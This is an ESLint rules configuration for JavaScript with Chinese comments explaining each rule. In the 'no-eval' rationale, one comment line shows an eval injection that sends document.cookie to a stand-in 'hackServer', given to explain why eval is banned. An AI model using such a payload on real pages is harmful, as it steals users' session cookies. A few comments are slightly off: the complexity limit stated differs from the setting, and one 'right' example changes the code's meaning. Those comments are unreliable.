module.exports = {
  rules: {
    /**
     * @meaning
     * 存储描述符设置set必须设置get
     */
    'accessor-pairs': ['error', { setWithoutGet: true, getWithoutSet: false }],

    /**
     * @meaning
     * if条件最多不超过5个
     */
    complexity: ['error', { max: 4 }],

    /**
     * @meaning
     * 如果else中出现return的话，强制要求省略else
     * 如果else if结尾出现return的话，更改else if为if return
     */
    'no-else-return': ['error', { allowElseIf: false }],

    /**
     * @meaning
     * 禁止使用!!或+进行隐式转换类型，使用Number String包装对象
     * @why
     * 降低可读性
     */
    'no-implicit-coercion': 'error',

    /**
     * @meaning
     * /=形式的正则需要加转义，以免误认为是除法操作符号
     */
    'no-div-regex': 'error',

    /**
     * @meaning
     * 文件中最多有一个类
     */
    'max-classes-per-file': 'error',

    /**
     * @meaning
     * 数组内置方法中需要返回值的回调函数必须包含return
     * 允许return后不跟随值语法(allowImplicit: true)
     * @why
     * 统一规范,防止map等函数忘了写return而导致的问题,
     * 如果只是想遍历不需要返回值的话,使用`forEach`方法.
     * @wrong
     * list.map(e => console.log(e));
     * @right
     * list.map(e => e + 'abc');
     * @group
     * 数组
     */
    'array-callback-return': ['error', { allowImplicit: true }],

    /**
     * @meaning
     * 类中的方法必须使用this
     * 或者把它变成static函数或提取出模块
     * @why
     * 让你精简类,把和实例不关联的方法移出类(提取出模块等)
     * 另一种相反的观点是：我需要在类中提供一些公共帮助方法,供
     * 多个类方法使用.而且继承的时候可以更好的重用.
     * @wrong
     * class A {
     *   method() { console.log('method')}
     * }
     * @right
     * class A {
     *   static method() { console.log('method')}
     *   methodB() {console.log(this.name)}
     *
     * }
     * @group
     * 类
     */
    'class-methods-use-this': [
      'error',
      {
        exceptMethods: [],
      },
    ],

    /**
     * @meaning
     * 函数的return语句统一形式：如果有`return`语句,那么要求每一个分支出口都有`return`语句
     * 且每个return语句的形式统一成两者之一：`return value`或者`return`
     * 忽略首字母大写的函数(这种函数认为是类)
     * @why
     * 1. 统一规范return形式,看到return就知道是函数出口,增强可读性
     * 2. 防止在写某个条件时候因为忘了写return而导致意外错误
     * @wrong
     * // 有出口没有return
     * function a() {
     *  if (xx) {
     *    return
     *  }
     * }
     * // return形式不统一
     * function b() {
     *  if (xx) {
     *    return
     *  }
     *  return true;
     * }
     * @right
     * function b() {
     *  if (xx) {
     *    return true
     *  }
     *  return false;
     * }
     * // 首字母大写,是类,忽略
     * function Foo() {
     *   // 安全构造函数,防止不使用new直接调用Foo时候this指向错误
     *   if (!(this instanceof Foo)) {
     *     return new Foo();
     *   }
     *   this.a = 0;
     * }
     * @group
     * 函数
     */
    'consistent-return': 'error',

    /**
     * @meaning
     * switch语句强制要求default块
     * 如果没有default行为,加上注释`//no default`跳过规则
     * @why
     * 通过明确要求写default语句,让开发人员意识到,
     * 是不是应该有默认行为而自己忘了写
     * @wrong
     * switch (a) {
     *  case 1:
     *     break;
     * }
     * @right
     * switch (a) {
     *  case 1:
     *     break;
     *  default:
     *     somecode;
     *     break;
     * }
     * // 注释明确告诉没有default
     * switch (a) {
     *  case 1:
     *     break;
     *  // no default
     * }
     * @group
     * 条件判断
     */
    'default-case': ['error', { commentPattern: '^no default$' }],

    /**
     * @meaning
     * 直接访问对象属性(属性名无需动态表示)时必须使用`.`来访问
     * @why
     * 更易阅读,更简洁
     * @wrong
     * obj['name']
     * @right
     * obj.name
     * @group
     * 对象
     */
    'dot-notation': ['error', { allowKeywords: true }],

    /**
     * @meaning
     * 强制使用 === 和 !== 比较值是否相等
     * @why
     * == 和 !==会对不同类型进行转换后比较,
     * 防止意外转换造成的错误.
     * 转换规则https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness#Loose_equality_using
     * ==的比较规则：
     * * 同类型
     *  执行 ===
     *  NaN和自己不相等
     * * 不同类型
     *  null == undefined
     *  原始类型往number转换然后比较
     *  对象类型通过toString成原始类型然后比较
     * @wrong
     * if (a == b) {}
     * @right
     * if (a === b) {}
     * @group
     * 比较符号
     */
    eqeqeq: ['error', 'always'],

    /**
     * @meaning
     * 不允许使用`alert`,`confirm`和`prompt`
     * @why
     * 这几个ui不好看,而且会阻塞js进程
     * @wrong
     * alert('abcd')
     * @right
     * customAlert('abcd')
     * @group
     * 最佳实践
     */
    'no-alert': 'warn',

    /**
     * @meaning
     * 不允许使用arguments.caller 或 arguments.callee
     * @why
     * 会导致部分情况下代码无法被引擎优化
     * 以后版本会被被es规范弃用
     * @wrong
     * @right
     * @group
     * 函数
     */
    'no-caller': 'error',

    /**
     * @meaning
     * 不允许在switch语句中使用变量声明语句(const,let,function,class)
     * 如果使用的话,用{}包含case中的代码块
     * @why
     * const,let,class,function公用一个作用域.可能导致意外的错误
     * @wrong
     *  switch (1) {
     *    case 0:
     *      const x = 1234;
     *      break;
     *    case 1:
     *      const x = 1234;
     *      break;
     * }
     *  switch (1) {
     *    case 0:
     *      function y() {}
     *      break;
     *    case 1:
     *      y();
     *      break;
     * }
     * @right
     *  switch (1) {
     *    case 0: {
     *      const x = 1234;
     *      break;
     *    }
     *    case 1: {
     *      const x = 1234;
     *      break;
     *    }
     * }
     * @group
     * 条件判断
     */
    'no-case-declarations': 'error',

    /**
     * @meaning
     * 禁止定义没有执行语句的空函数
     * 允许箭头函数是空函数
     * @why
     * 空函数增加读代码的成本：需要猜测写的人是有什么特殊含义还是写错了
     * @wrong
     * function foo() {}
     * @right
     * function foo() {
     *  // 默认函数防止报错
     * }
     * const foo = () => {}
     * @group
     * 函数
     */
    'no-empty-function': [
      'error',
      {
        allow: ['arrowFunctions'],
      },
    ],

    /**
     * @meaning
     * 不允许出现空解构
     * @why
     * @wrong
     * const {a: {}} = foo;
     * @right
     * @group
     */
    'no-empty-pattern': 'error',

    /**
     * @meaning
     * 不允许使用eval
     * @why
     * 1. eval的字符串有js注入的风险：比如让用户输入四则运算eval('3 + 4'),但是黑客输入js代码:eval('window.location = /hackServer?cookie=document.cookie')
     * 2. 无法debug eval中的代码
     * @wrong
     * @right
     * @group
     * 最佳实践
     */
    'no-eval': 'error',

    /**
     * @meaning
     * 禁止拓展原生对象
     * @why
     * 防止有人改变原生的方法,而其他人不知道,导致错误使用
     * @wrong
     * Object.prototype.a = "a";
     * Array.prototype.a = "a";
     * @right
     * @group
     * 对象
     */
    'no-extend-native': 'error',

    /**
     * @meaning
     * 禁止无效bind(无this,箭头函数,函数体是自执行语句)
     * @why
     * 箭头函数this无法改变
     * 无this函数不要用bind
     * 自执行函数的this无法绑定
     * @wrong
     * @right
     * @group
     * 函数
     */
    'no-extra-bind': 'error',

    /**
     * @meaning
     * switch中每个case必须有对应break
     * @why
     * 防止因为忘记写break导致额外执行了其他case代码段
     * @wrong
     * case 1:
     *  dosomething();
     * case 2:
     *  dosomething();
     * @right
     * case 1:
     *  dosomething();
     *  break;
     * case 2:
     *  dosomething();
     *  break;
     * @group
     * 条件判断
     */
    'no-fallthrough': 'error',

    /**
     * @meaning
     * 禁止重新分配全局对象
     * @why
     * @wrong
     * @right
     * @group
     * 最佳实践
     */
    'no-global-assign': ['error', { exceptions: [] }],

    /**
     * @meaning
     * 不允settimeout传递字符串
     * @why
     * 理由同no-eval
     * @wrong
     * setTimeout("alert('Hi!');", 100);
     * @right
     * setTimeout(function() {
     *     alert("Hi!");
     * }, 100);
     * @group
     */
    'no-implied-eval': 'error',

    /**
     * @meaning
     * 不允许使用 `__iterator__`属性
     * @why
     * 这个属性是SpiderMonkey拓展所使用的预留属性
     * @wrong
     * @right
     * @group
     */
    'no-iterator': 'error',

    /**
     * @meaning
     * 不允许在switch和循环中使用label语法
     * @why
     * label是弃用语法
     * @wrong
     * @right
     * @group
     */
    'no-labels': 'error',

    /**
     * @meaning
     * 禁止出现冗余的`{}`
     * @why
     * 消除混淆
     * @wrong
     * @right
     * @group
     */
    'no-lone-blocks': 'error',

    /**
     * @meaning
     * 不允许在循环中创建函数
     * @why
     * 创建函数就是创建闭包,防止错误引用变量或造成内存溢出
     * @wrong
     * // 共享上下文环境,都输出10
     * for (var i = 0; i < 10; i++) {
     *    funcs[i] = function() {
     *        return i;
     *    };
     *}
     * @right
     * var a = function() {};
     * for (var i=10; i; i--) {
     *     a();
     * }
     * 函数没有记住外层的变量引用
     * for (var i=10; i; i--) {
     *     var a = function() {};
     *     a();
     * }
     * // 可以,引用的是块作用域变量
     * for (let i=10; i; i--) {
     *     var a = function() { return i; };
     *     a();
     * }
     * // 可以,函数保存的引用是外层不变的变量
     * var foo = 100;
     * for (let i=10; i; i--) {
     *     var a = function() { return foo; };
     *     a();
     * }
     * @group
     */
    'no-loop-func': 'error',

    /**
     * @meaning
     * 禁止在字符串变量中使用`\回车`的方法来书写多行字符串
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-multi-str': 'error',

    /**
     * @meaning
     * 禁止this出现在类或者类对象以外的地方
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-invalid-this': 'error',

    /**
     * @meaning
     * 禁止出现未定义变量的数字
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-magic-numbers': [
      'error',
      {
        ignore: [-1, 0, 1, 2, 3, 4, 5, 10, 24, 60, 365, 1000],
        ignoreArrayIndexes: true,
        enforceConst: true,
        detectObjects: false,
      },
    ],

    /**
     * @meaning
     * 禁止出现固定的循环条件
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-unmodified-loop-condition': 'error',

    /**
     * @meaning
     * 禁止出现无效的call或apply（无效的意思是等价于直接调用函数）
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-call': 'error',

    /**
     * @meaning
     * 禁止出现无效的catch语句（捕获后直接抛出）
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-catch': 'error',

    /**
     * @meaning
     * 注释中禁止出现todo，fixme等语句）
     * @why
     * 这类语句标志着代码待完善或修复，如果出现，警告开发者去完成
     * 如果已经完成，删除掉注释。
     * 好的注释是需要不断维护的注释。一个过时的注释不如没有注释
     * @wrong
     * @right
     * @group
     */
    'no-warning-comments': [
      'error',
      { terms: ['todo', 'fixme', 'xxx'], location: 'start' },
    ],

    /**
     * @meaning
     * async函数必须包含await语法
     * 否则不要使用async函数
     * @why
     * async函数和普通函数不同，防止出错
     * @wrong
     * @right
     * @group
     */
    'require-await': 'error',

    /**
     * @meaning
     * 正则表达式强制使用u标记
     * @why
     * 1. 使用u可以正确识别四个字节的utf-16编码。
     *     /^[👍]$/.test("👍")
     *     /^[👍]$/u.test("👍")
     * 2. 可以识别隐含的正则错误表达式
     *     /\w{1, 2/.test('abc')
     *     /\w{1, 2/u.test('abc')
     * @wrong
     * /^[👍]$/.test("👍")
     * @right
     * /^[👍]$/u.test("👍")
     * @group
     */
    'require-unicode-regexp': 'error',

    /**
     * @meaning
     * 禁止使用new创建对象后不给对象设置对应变量
     * @why
     * new 操作符做了很多操作：
     * 1. 创建一个新对象
     * 2. 让构造函数的this指向新对象
     * 3. 执行函数
     * 4. 返回对象
     * 如果你仅仅是为了执行构造函数,不要使用new操作符
     * @wrong
     * new Func()
     * @right
     * const obj = new Func()
     * @group
     * 对象
     */
    'no-new': 'error',

    /**
     * @meaning
     * 禁止在程序中出现strict
     * @why
     * 使用babel插件自动添加
     */
    strict: ['error', 'never'],

    /**
     * @meaning
     * 禁止使用new创建函数
     * @why
     * 理由同no-eval
     * @wrong
     * var x = new Function("a", "b", "return a + b");
     * @right
     * var x = function (a, b) {
     *     return a + b;
     * };
     * @group
     * 函数
     */
    'no-new-func': 'error',

    /**
     * @meaning
     * 禁止`new 包装器对象`
     * @why
     * - 什么是包装器对象
     *   'abc' 134 true 都是原始类型,但是我们可以调用它们的方法：
     *   'abc'.toString() 134.toString() true.toString()是为什么？每次使用方法时,
     *   通过new String,Boolean,Number临时创建一个对象,继承类方法.使用完方法后,再回复成原始
     *   类型.
     * - 使用有什么问题
     *     1. 使用包装器对象返回的是对象,不是原始类型
     *         const str = new String('str'); typeof str //'object'
     *     2. 使用包装器对象创建bool值,永远是true
     *         if (new Boolean(fasle)) { //执行}
     * - 把包装器对象作为函数
     *     类型转换,返回原始类型
     * @wrong
     * const str = new String('abc')
     * @right
     * const str = 'abcd';
     * const str = String(1234)
     * @group
     * 对象
     */
    'no-new-wrappers': 'error',

    /**
     * @meaning
     * 禁止数字写成以0开头形式
     * @why
     * 会被转换成8进制
     * @wrong
     * // 57
     * var num = 071;
     * // 61
     * var result = 5 + 070;
     * @right
     * var num = '071'
     * @group
     * 数字
     */
    'no-octal': 'error',

    /**
     * @meaning
     * 禁止使用字符串中的八进制转义
     * @why
     * js中预设这种转义码/[0-7][0-7][0-7]对应了字符串
     * 统一使用/u形式的unicode码
     * @wrong
     * var foo = 'Copyright \251';
     * @right
     * // unicode
     * var foo = "Copyright \u00A9";
     * @group
     * 字符串
     */
    'no-octal-escape': 'error',

    /**
     * @meaning
     * 禁止改变函数参数引用或改变参数内部属性
     * @why
     * 1. 有可能突变外部对象
     * const obj = {a:1}
     * function b (args) {
     *  args.a += 1;
     * }
     * // obj值改变
     * b(obj)
     * 2. 突变arguments对象,导致突变后对arguments的引用错误
     * function b(args) {
     *  // 输出 { '0': 'test' }
     *  console.log(arguments);
     *  // 修改了args
     *  args = 'aaaa';
     *  // 输出 { '0': 'aaaa' }
     *  console.log(arguments);     *
     * }
     * b('test')
     * @wrong
     * function foo(bar) {bar = 13}
     * function foo(bar) {bar.value = 13}
     * @right
     * function foo(bar) {const baz = bar}
     * @group
     * 函数
     */
    'no-param-reassign': [
      'error',
      {
        props: true,
        ignorePropertyModificationsFor: [
          // for serviceworker
          'registration',
          // for reduce accumulators
          'acc',
          // for reduce accumulators
          'accumulator',
          // for e.returnvalue
          'e',
          // for Koa routing
          'ctx',
          // for Express requests
          'req',
          // for Express requests
          'request',
          // for Express responses
          'res',
          // for Express responses
          'response',
        ],
      },
    ],

    /**
     * @meaning
     * 禁止使用__proto__属性
     * @why
     * js保留属性,表示指向对象的原型对象
     * @wrong
     * @right
     * @group
     * 对象
     */
    'no-proto': 'error',

    /**
     * @meaning
     * 禁止重复声明变量
     * @why
     * @wrong
     * @right
     * @group
     * 变量
     */
    'no-redeclare': 'error',

    /**
     * @meaning
     * 禁止使用特定对象的特定属性
     * 1. 禁止使用arguments.callee
     * 2. 禁止使用全局对象(global,self,window)的isFinite,(使用Number.isFinite,因为全局的isFinite会把非数字转换成后判断)
     * 3. 禁止使用全局对象(同上)的isNaN,(请使用Number.isNaN,因为全局的isFinite会转换成数字后判断)
     * 4. 禁止使用对象的__defineGetter__和__defineSetter__方法,使用Object.definePropery代替
     * 5. 禁止使用Math.pow.幂运算,使用**代替
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-restricted-properties': [
      'error',
      {
        object: 'arguments',
        property: 'callee',
        message: 'arguments.callee is deprecated',
      },
      {
        object: 'global',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'self',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'window',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'global',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        object: 'self',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        object: 'window',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        property: '__defineGetter__',
        message: 'Please use Object.defineProperty instead.',
      },
      {
        property: '__defineSetter__',
        message: 'Please use Object.defineProperty instead.',
      },
      {
        object: 'Math',
        property: 'pow',
        message: 'Use the exponentiation operator (**) instead.',
      },
    ],

    /**
     * @meaning
     * 禁止在return 语句中进行赋值
     * @why
     * 这种语法容易造成混淆：
     * function doSome() {
     *  return foo = bar + 2;
     * }
     * 是不是想写return foo === bar + 2,少写=造成的意外呢？
     * @wrong
     * function doSome() {
     *  return foo = bar + 2;
     * }
     * @right
     * function doSome() {
     *  return foo === bar + 2;
     * }
     * @group
     */
    'no-return-assign': ['error', 'always'],

    /**
     * @meaning
     * 禁止在return中使用await语法
     * @why
     * 冗余的写法
     * 处理async返回值和await处理参数的方式都是一样的.
     * @wrong
     * @right
     * @group
     */
    'no-return-await': 'error',

    /**
     * @meaning
     * 禁止在url中使用JavaScript脚本
     * @why
     * 同no-eval
     * @wrong
     * location.href = "javascript:void(0)";
     * @right
     * @group
     * 安全
     */
    'no-script-url': 'error',

    /**
     * @meaning
     * 禁止自我分配
     * @why
     * 无效,一般是拼写错误
     * @wrong
     * foo = foo;
     * @right
     * @group
     */
    'no-self-assign': [
      'error',
      {
        props: false,
      },
    ],

    /**
     * @meaning
     * 禁止自己比较
     * @why
     * 无效,一般是拼写错误
     * @wrong
     * self !== self
     * @right
     * @group
     */
    'no-self-compare': 'error',

    /**
     * @meaning
     * 禁止使用逗号运算符
     * @why
     * 造成意外错误
     * @wrong
     * @right
     * @group
     */
    'no-sequences': 'error',

    /**
     * @meaning
     * throw只允许throw error对象
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-throw-literal': 'error',

    /**
     * @meaning
     * 禁止未使用的表达式
     * 主要目的禁止使用短路运算符替代if
     * 以及意外的书写错误
     * @why
     * 短路运算符降低可读性
     * @wrong
     * @right
     * @group
     */
    'no-unused-expressions': [
      'error',
      {
        allowShortCircuit: false,
        allowTernary: false,
        allowTaggedTemplates: false,
      },
    ],

    /**
     * @meaning
     * 禁止无效的字符串连接('a' + 'b' => 'ab')
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-concat': 'error',

    /**
     * @meaning
     * 禁止出现无效的转义符号('a\b')
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-escape': 'error',

    /**
     * @meaning
     * 禁止出现冗余return(在出口处return并且没有跟随值)
     * @why
     * @wrong
     * function t() {
     *  doSome()
     *  return
     * }
     * @right
     * function t() {
     *  return doSome()
     * }
     * @group
     */
    'no-useless-return': 'error',

    /**
     * @meaning
     * 禁止使用void运算符
     * @why
     * void语法：执行void后面表达式,返回return
     * 执行void后面表达式有可能会产生副作用.
     * let a = 1;
     * console.log(void (a = 2));
     * console.log(a);
     * @wrong
     * @right
     * @group
     */
    'no-void': 'error',

    /**
     * @meaning
     * 禁止使用with语法
     * @why
     * 将对象的成员添加到当前作用域,可能出现问题
     * @wrong
     * @right
     * @group
     */
    'no-with': 'error',

    /**
     * @meaning
     * promise-reject的参数必须使用error对象或自定义对象
     * @why
     * reject表示拒绝的意思，一般用来表示程序的意外结果或错误
     * 用Error能更明确语义，而且error保存栈调用信息，可以追踪到reject的位置，
     * 而非error不不行
     * @wrong
     * @right
     * @group
     */
    'prefer-promise-reject-errors': ['error', { allowEmptyReject: true }],

    /**
     * @meaning
     * parseInt函数必须提供第二个参数-进制基数
     * @why
     * 因为parseInt会根据输入自动检测是属于哪个进制,这可能会造成
     * 和意图不符合的意外错误,比如：
     * var num = parseInt("071");      // 57
     * var num = parseInt("071", 10);  // 71
     * @wrong
     * var num = parseInt("071");      // 57
     * @right
     * var num = parseInt("071", 10);  // 71
     * @group
     */
    radix: 'error',

    /**
     * @meaning
     * 要求条件判断语句中先出现变量,后出现常量
     * @why
     * 增强可读性,比如if (color === 'red')可理解为如果颜色是红色的
     * @wrong
     * if ('red' === color)
     * @right
     * if ( color === 'red')
     * @group
     */
    yoda: 'error',
  },
};
